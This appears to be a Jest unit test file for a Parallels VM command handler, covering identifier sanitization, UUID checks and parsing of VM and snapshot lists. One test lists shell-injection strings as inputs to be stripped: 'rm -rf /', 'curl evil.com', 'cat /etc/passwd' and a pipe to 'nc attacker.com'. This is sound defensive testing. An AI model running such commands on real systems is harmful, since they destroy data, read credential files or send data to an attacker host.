import {
  sanitizeVmIdentifier,
  isValidUuid,
  parseVmList,
  parseSnapshotList,
} from '../../prlctl-handler';

describe('prlctl-handler', () => {
  describe('sanitizeVmIdentifier', () => {
    it('should preserve valid alphanumeric characters', () => {
      const input = 'TestVM123';
      expect(sanitizeVmIdentifier(input)).toBe('TestVM123');
    });

    it('should preserve hyphens and underscores', () => {
      const input = 'Test-VM_123';
      expect(sanitizeVmIdentifier(input)).toBe('Test-VM_123');
    });

    it('should preserve UUID format with braces', () => {
      const uuid = '{12345678-1234-1234-1234-123456789012}';
      expect(sanitizeVmIdentifier(uuid)).toBe(uuid);
    });

    it('should remove shell metacharacters', () => {
      const maliciousInputs = [
        ['vm;rm -rf /', 'vmrm-rf'],
        ['vm`echo pwned`', 'vmechopwned'],
        ['vm$(curl evil.com)', 'vmcurlevilcom'],
        ['vm && cat /etc/passwd', 'vmcatetcpasswd'],
        ['vm | nc attacker.com', 'vmncattackercom'],
        ['vm\nrm -rf /', 'vmrm-rf'],
        ['vm${IFS}cat', 'vm{IFS}cat'],
      ];

      maliciousInputs.forEach(([input, expected]) => {
        expect(sanitizeVmIdentifier(input)).toBe(expected);
      });
    });

    it('should handle empty string', () => {
      expect(sanitizeVmIdentifier('')).toBe('');
    });

    it('should handle special characters in VM names', () => {
      const input = 'VM@#$%^&*()+=[]\\|;:\'"<>,.?/~!';
      const result = sanitizeVmIdentifier(input);
      expect(result).toBe('VM');
      expect(result).not.toMatch(/[^a-zA-Z0-9\-_{}]/);
    });
  });

  describe('isValidUuid', () => {
    it('should validate correct UUID format', () => {
      const validUuids = [
        '{12345678-1234-1234-1234-123456789012}',
        '{ABCDEF01-2345-6789-ABCD-EF0123456789}',
        '{abcdef01-2345-6789-abcd-ef0123456789}',
      ];

      validUuids.forEach((uuid) => {
        expect(isValidUuid(uuid)).toBe(true);
      });
    });

    it('should reject invalid UUID formats', () => {
      const invalidUuids = [
        '12345678-1234-1234-1234-123456789012', // missing braces
        '{12345678-1234-1234-1234-12345678901}', // too short
        '{12345678-1234-1234-1234-1234567890123}', // too long
        '{12345678-1234-1234-1234-12345678901g}', // invalid character
        '{12345678_1234_1234_1234_123456789012}', // wrong separator
        '{}', // empty
        '', // empty string
        'not-a-uuid',
      ];

      invalidUuids.forEach((uuid) => {
        expect(isValidUuid(uuid)).toBe(false);
      });
    });
  });

  describe('parseVmList', () => {
    it('should parse empty list', () => {
      const result = parseVmList('');
      expect(result).toEqual([]);
    });

    it('should parse single VM with IP', () => {
      const output = '{12345678-1234-1234-1234-123456789012} running 192.168.1.100 Test VM';
      const result = parseVmList(output);

      expect(result).toHaveLength(1);
      expect(result[0]).toEqual({
        uuid: '{12345678-1234-1234-1234-123456789012}',
        status: 'running',
        ipAddress: '192.168.1.100',
        name: 'Test VM',
      });
    });

    it('should parse single VM without IP', () => {
      const output = '{12345678-1234-1234-1234-123456789012} stopped - Test VM';
      const result = parseVmList(output);

      expect(result).toHaveLength(1);
      expect(result[0]).toEqual({
        uuid: '{12345678-1234-1234-1234-123456789012}',
        status: 'stopped',
        ipAddress: undefined,
        name: 'Test VM',
      });
    });

    it('should parse multiple VMs', () => {
      const output = `UUID                                     STATUS       IP_ADDR         NAME
{11111111-1111-1111-1111-111111111111} running      192.168.1.100   Ubuntu Server
{22222222-2222-2222-2222-222222222222} stopped      -               Windows 11
{33333333-3333-3333-3333-333333333333} suspended    192.168.1.101   macOS Monterey`;

      const result = parseVmList(output);

      expect(result).toHaveLength(3);
      expect(result[0].name).toBe('Ubuntu Server');
      expect(result[1].name).toBe('Windows 11');
      expect(result[2].name).toBe('macOS Monterey');
      expect(result[1].ipAddress).toBeUndefined();
    });

    it('should handle VMs with spaces in names', () => {
      const output =
        '{12345678-1234-1234-1234-123456789012} running 192.168.1.100 My Test VM with Spaces';
      const result = parseVmList(output);

      expect(result[0].name).toBe('My Test VM with Spaces');
    });

    it('should skip malformed lines', () => {
      const output = `{11111111-1111-1111-1111-111111111111} running 192.168.1.100 Valid VM
malformed line without proper format
{22222222-2222-2222-2222-222222222222} stopped - Another Valid VM`;

      const result = parseVmList(output);

      expect(result).toHaveLength(2);
      expect(result[0].name).toBe('Valid VM');
      expect(result[1].name).toBe('Another Valid VM');
    });
  });

  describe('parseSnapshotList', () => {
    it('should parse empty snapshot list', () => {
      const result = parseSnapshotList('');
      expect(result).toEqual([]);
    });

    it('should parse single snapshot', () => {
      const output = '{12345678-1234-1234-1234-123456789012}  "Initial State" 2024-01-15 10:30:00';
      const result = parseSnapshotList(output);

      expect(result).toHaveLength(1);
      expect(result[0]).toEqual({
        id: '{12345678-1234-1234-1234-123456789012}',
        name: 'Initial State',
        date: '2024-01-15 10:30:00',
        current: false,
      });
    });

    it('should identify current snapshot', () => {
      const output = `{11111111-1111-1111-1111-111111111111}  "Snapshot 1" 2024-01-15 10:00:00
{22222222-2222-2222-2222-222222222222} * "Current State" 2024-01-15 11:00:00
{33333333-3333-3333-3333-333333333333}  "Snapshot 3" 2024-01-15 12:00:00`;

      const result = parseSnapshotList(output);

      expect(result).toHaveLength(3);
      expect(result[0].current).toBe(false);
      expect(result[1].current).toBe(true);
      expect(result[2].current).toBe(false);
    });

    it('should handle snapshots with special characters in names', () => {
      const output =
        '{12345678-1234-1234-1234-123456789012}  "Snapshot with quotes and special chars" 2024-01-15';
      const result = parseSnapshotList(output);

      expect(result[0].name).toBe('Snapshot with quotes and special chars');
    });

    it('should skip malformed snapshot lines', () => {
      const output = `{11111111-1111-1111-1111-111111111111}  "Valid Snapshot" 2024-01-15
malformed snapshot line
{22222222-2222-2222-2222-222222222222}  "Another Valid" 2024-01-16`;

      const result = parseSnapshotList(output);

      expect(result).toHaveLength(2);
      expect(result[0].name).toBe('Valid Snapshot');
      expect(result[1].name).toBe('Another Valid');
    });
  });
});
